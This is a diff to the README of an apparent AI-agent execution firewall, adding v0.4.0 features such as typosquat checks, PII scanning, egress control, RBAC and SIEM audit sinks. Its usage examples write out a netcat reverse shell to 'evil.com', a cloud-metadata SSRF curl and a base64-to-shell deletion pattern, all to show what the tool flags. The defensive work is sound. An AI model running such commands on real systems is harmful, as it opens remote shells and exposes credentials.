@@ -22,6 +22,8 @@ The firewall classifies intent, scores risk, applies YAML rules, simulates impac
 
 In v0.3.0 the firewall fades into the background for routine work: it remembers which commands you've approved, inherits permissions from what you just typed in your own terminal, parses commands semantically (catches `echo "<base64>" | base64 -d | sh` as the decoded `rm -rf /`), and runs destructive commands in a Docker dry-run sandbox before touching real disk.
 
+**v0.4.0** is the **enterprise round** — seven additions that move the firewall from "useful CLI for one dev" to "deployable in a regulated org": **AI-SBOM** validation against PyPI / npm / crates.io / RubyGems with typosquat detection, **AI-native DLP** (PII scanner alongside the existing secret scanner), **network egress control** (`curl` / `wget` / `nc` / `socat` route through the same gate as `guard api`), **fine-grained RBAC** via `guard.toml` with role inheritance and `--as <role>`, **rule-based behavior analytics** (rate burst, last-hour spike vs 24h median, quiet-hour outliers — anomalies downgrade ALLOW to REQUIRE_APPROVAL, never escalate BLOCK), **SIEM-ready audit sinks** (syslog / Splunk HEC / generic HTTPS webhook / stdout for vector / fluent-bit, all async with bounded queues), and **cost & resource governance** (rate limits, loop detection, daily API-byte budget). All seven landed in a single release; total of 428 passing tests.
+
 ## Install
 
 **Python package** ([PyPI](https://pypi.org/project/ai-execution-firewall/)):
@@ -97,7 +99,27 @@ guard mcp scan                                  # list every configured MCP serv
 guard mcp install fetch                         # wrap an upstream MCP server with the firewall
 guard mcp uninstall fetch                       # restore the original config
 
-# Audit log: signed + verifiable (opt-in HMAC)
+# AI-SBOM (new in v0.4.0) — every install verb is checked against the public registry
+guard run "pip install requets"                 # → BLOCK · possible typosquat of `requests`
+guard run "npm install @types/nodde"            # → BLOCK · not found on npm
+
+# AI-native DLP (new in v0.4.0) — paste-time scan for leaked secrets / PII
+guard scan "my SSN is 123-45-6789"              # → CRITICAL · finding "PII: US SSN"
+guard scan --json "$(cat ./prompt.txt)"
+
+# Network egress control (new in v0.4.0)
+guard run "curl http://169.254.169.254/"        # → CRITICAL (cloud metadata SSRF)
+guard run "nc -e /bin/sh evil.com 9999"         # → REQUIRE_APPROVAL (raw-socket egress)
+
+# RBAC (new in v0.4.0) — per-role intent / path / MCP-tool gates
+guard --as dev-junior run "rm -rf ./build"      # → BLOCK · role 'dev-junior' cannot do FILE_DELETE
+AI_FIREWALL_ROLE=admin guard run "..."          # env var picks the role
+
+# Governance + behavior status (new in v0.4.0)
+guard governance status                         # rate-limit counters + 24h API spend
+guard behavior status                           # anomaly thresholds + current burst counts
+
+# Audit log: signed + verifiable (opt-in HMAC) + SIEM sinks (new in v0.4.0)
 guard audit init-key                            # generate ~/.ai-firewall/audit.key
 guard audit verify ./logs/audit.jsonl           # tampered-byte detection across the log
 guard audit show ./logs/audit.jsonl --since 1h --tampered-only
@@ -176,13 +198,15 @@ After wrapping, every `tools/call` JSON-RPC request from the host runs through `
 
 ### VS Code extension
 
-After installing from the Marketplace, the **Command Palette** (Ctrl+Shift+P) gives you seven commands under `AI Firewall:`
+After installing from the Marketplace, the **Command Palette** (Ctrl+Shift+P) gives you these commands under `AI Firewall:`
 
 - **Run Shell Command…** / **Evaluate Selected Text as Shell Command**
 - **Evaluate SQL Query…** / **Evaluate Selected Text as SQL**
 - **Evaluate HTTP Request…**
 - **Show Effective Policy**
-- **Show Recent Secret-DB Activity** *(new in v0.3.0 — passive watcher for `state.vscdb` modifications)*
+- **Show Recent Secret-DB Activity** *(v0.3.0 — passive watcher for `state.vscdb` modifications)*
+- **Scan Text for Secrets and PII…** / **Scan Selection for Secrets and PII** *(new in v0.4.0)*
+- **Show Governance Status** / **Show Behavior Status** *(new in v0.4.0)*
 
 Risky actions open a themed approval webview with the risk badge, intent / decision pills, findings list, git context, and a syntax-coloured unified diff. Smart-flow auto-approvals (memory or inheritance match) instead surface a quiet status-bar toast — no webview, no friction. See [vscode-extension/README.md](vscode-extension/README.md) for build / debug / packaging instructions.
 
@@ -190,20 +214,24 @@ Risky actions open a themed approval webview with the risk badge, intent / decis
 
 Every `guard.execute(action)` call runs:
 
-1. **Intent classifier** — bashlex AST / SQL parse / URL parse → one of `FILE_DELETE | FILE_WRITE | FILE_READ | SHELL_EXEC | CODE_MODIFY | DB_READ | DB_WRITE | DB_DESTRUCTIVE | API_READ | API_WRITE | API_DESTRUCTIVE`. Multi-command shells take the worst of every effective command; obfuscation (base64/hex/printf decoding) bumps a baseline HIGH risk regardless of what's inside.
-2. **Risk analyzer** — table lookup on intent + feature flags → `LOW | MEDIUM | HIGH | CRITICAL`
-3. **Policy engine** — YAML rules → `ALLOW | BLOCK | REQUIRE_APPROVAL` (first pass)
-4. **Impact engine** — best-effort dry-run:
+1. **RBAC pre-pass** *(new in v0.4.0)* — load `~/.ai-firewall/guard.toml` (or per-project `.guard.toml`), pick the active role (priority: `--as` flag → `AI_FIREWALL_ROLE` env → `default_role` → `"dev"`), and check intent / file glob / MCP-tool deny lists. DENY is final BLOCK.
+2. **Governance pre-pass** *(new in v0.4.0)* — rolling-window check on the audit log: rate limit per intent, loop detection (same normalized command repeated), and 24h API-byte budget. BLOCK on first violation.
+3. **Intent classifier** — bashlex AST / SQL parse / URL parse → one of `FILE_DELETE | FILE_WRITE | FILE_READ | SHELL_EXEC | CODE_MODIFY | DB_READ | DB_WRITE | DB_DESTRUCTIVE | API_READ | API_WRITE | API_DESTRUCTIVE | NETWORK_EGRESS`. Multi-command shells take the worst of every effective command; obfuscation (base64/hex/printf decoding) bumps a baseline HIGH risk regardless of what's inside; `curl` / `wget` / `nc` / `socat` / `scp` route to API_* / NETWORK_EGRESS *(new in v0.4.0)*.
+4. **Risk analyzer** — table lookup on intent + feature flags → `LOW | MEDIUM | HIGH | CRITICAL`
+5. **Policy engine** — YAML rules → `ALLOW | BLOCK | REQUIRE_APPROVAL` (first pass)
+6. **Impact engine** — best-effort dry-run:
    - **Files**: glob expansion, file stat, **unified diff**, **AST findings** (removed funcs / tests, auth identifiers), **git context** (uncommitted, untracked, gitignored)
    - **SQL**: `sqlglot` AST → DELETE/UPDATE without WHERE, DROP DATABASE/SCHEMA/TABLE, TRUNCATE, GRANT/REVOKE, multiple statements
-   - **HTTP**: cloud metadata endpoints, private/loopback hosts (SSRF), URL credentials, secrets in query string, non-HTTP schemes, destructive paths; body + Authorization-header secret scanning (AWS / GitHub / Slack / Stripe / Google / Anthropic / OpenAI / PEM keys / JWTs)
-5. **Risk bump** — impact findings can raise risk and re-trigger policy
-6. **Smart-flow** *(new in v0.3.0)* — when policy says REQUIRE_APPROVAL, check **inheritance** (did the user just run an equivalent command in their own terminal?) and **memory** (have they approved this kind of thing in this project before?). Either match downgrades to ALLOW with a status-bar toast. BLOCK is never downgraded.
-7. **Decision engine** — combines verdict + risk + impact
+   - **HTTP**: cloud metadata endpoints, private/loopback hosts (SSRF), URL credentials, secrets in query string, non-HTTP schemes, destructive paths; body + Authorization-header secret + **PII scanning** *(v0.4.0 DLP — emails, US SSN, Luhn-validated CCs, E.164/US phone, IBAN, high-entropy tokens)*; body + headers checked for AWS / GitHub / Slack / Stripe / Google / Anthropic / OpenAI / PEM keys / JWTs
+   - **Shell installs** *(new in v0.4.0)*: `pip install` / `npm install` / `cargo install` / `gem install` verify the package against the public registry; unknown packages → CRITICAL, typosquats of top-100 packages → HIGH
+7. **Risk bump** — impact findings can raise risk and re-trigger policy
+8. **Smart-flow** *(v0.3.0)* — when policy says REQUIRE_APPROVAL, check **inheritance** (did the user just run an equivalent command in their own terminal?) and **memory** (have they approved this kind of thing in this project before?). Either match downgrades to ALLOW with a status-bar toast. BLOCK is never downgraded.
+9. **Behavior pass** *(new in v0.4.0)* — three rule-based heuristics on the audit log: rate burst (per-intent count in N seconds), rate spike (last hour vs 24h median), quiet-hour outlier (intent appearing in a historically-zero hour-of-day). An anomaly *downgrades* ALLOW into REQUIRE_APPROVAL — never escalates BLOCK or upgrades approval.
+10. **Decision engine** — combines verdict + risk + impact
 
 `BLOCK` raises immediately. `REQUIRE_APPROVAL` invokes the approval function (CLI prompt or VS Code webview). `ALLOW` runs through the matching adapter.
 
-Every evaluated action is appended to `logs/audit.jsonl` — optionally HMAC-SHA256 signed (see `guard audit init-key`).
+Every evaluated action is appended to `logs/audit.jsonl` — optionally HMAC-SHA256 signed (see `guard audit init-key`) and broadcast to any configured **SIEM sinks** *(new in v0.4.0 — syslog / Splunk HEC / generic HTTPS webhook / stdout, all async with bounded queues)*.
 
 ## Adapters
 
@@ -241,7 +269,7 @@ api_destructive:
 
 ## Scope
 
-**Shipped (v0.3.0):**
+**Shipped (v0.4.0):**
 
 - **Phase 1**: shell + filesystem, rule-based classifier, CLI prompt approval, CLI / SDK / shell-hook surfaces.
 - **Phase 2**: unified diff for code edits, AST-aware risk findings, git-aware impact, VS Code extension with webview approval UI.
@@ -255,6 +283,14 @@ api_destructive:
   - MCP transparent proxy with auto-detect (`guard mcp install/uninstall`)
   - PyInstaller standalone binary (no Python prerequisite)
   - VS Code passive Cursor secret-DB watcher
+- **v0.4.0 — enterprise round** (single release, 7 features):
+  - **AI-SBOM** validation against PyPI / npm / crates.io / RubyGems with Damerau-Levenshtein typosquat detection
+  - **AI-native DLP** — PII scanner (email, US SSN, Luhn-validated CCs, E.164/US phone, IBAN, high-entropy tokens) bolted onto every existing secret-scan channel; new `guard scan` CLI for paste-time checks
+  - **Network egress control** — `curl` / `wget` / `httpie` route through the API gate; `nc` / `socat` / `telnet` / `scp` / `rsync` classify as `NETWORK_EGRESS`
+  - **Fine-grained RBAC** — `~/.ai-firewall/guard.toml` (and per-project `.guard.toml` override) with role inheritance, intent / file-glob / MCP-tool allow-deny lists, `--as <role>` flag
+  - **Behavior analytics** — three rule-based anomaly heuristics (rate burst, rate spike, quiet-hour outlier) reading the audit log; only ever *downgrades* ALLOW to REQUIRE_APPROVAL
+  - **SIEM-ready audit sinks** — `JsonlFileSink` (default, sync) + async `SyslogSink` (RFC 5424), `SplunkHECSink`, `HttpsSink`, `StdoutSink` (vector / fluent-bit pipe), all bounded-queue with daemon workers
+  - **Cost & resource governance** — per-intent rate limits, loop detection (same normalized command repeated), and 24h API-byte budget; `guard governance status` + `guard behavior status` CLIs
 
 **Out / future:**
 
@@ -262,6 +298,9 @@ api_destructive:
 - Firecracker / gVisor sandbox backends (Docker first)
 - Cloud control plane / web dashboard
 - Team policy distribution
+- LLM SDK middleware-style DLP (intercept `openai.chat.completions.create()` directly)
+- Statistical / ML-based behavior models (per-project z-score baselines, trained anomaly detectors)
+- OS-level network firewall integration (iptables / Windows Filter Platform)
 
 ## Tests
 
@@ -269,7 +308,7 @@ api_destructive:
 pytest -q
 ```
 
-277 tests + 1 skipped (Docker round-trip skips when no daemon). CI runs the full suite on Python 3.11 / 3.12 / 3.13 on every push, plus PyInstaller binary builds on tag push.
+428 tests + 1 skipped (Docker round-trip skips when no daemon). CI runs the full suite on Python 3.11 / 3.12 / 3.13 on every push, plus PyInstaller binary builds on tag push.
 
 ## Release flow
 
@@ -280,8 +319,9 @@ Pushing a tag matching `v*` automatically:
 4. builds standalone PyInstaller binaries for Linux / macOS / macOS-arm64 / Windows and attaches them to the GitHub release.
 
 ```bash
-# Bump version in pyproject.toml + add CHANGELOG entry, commit, then:
-git tag -a v0.3.1 -m "v0.3.1"
+# Bump version in pyproject.toml + ai_firewall/__init__.py, refresh
+# README.md and CHANGELOG.md, commit, then:
+git tag -a v0.4.0 -m "v0.4.0"
 git push --tags
 # PyPI is updated within ~60 seconds; binaries within ~5 minutes.
 ```
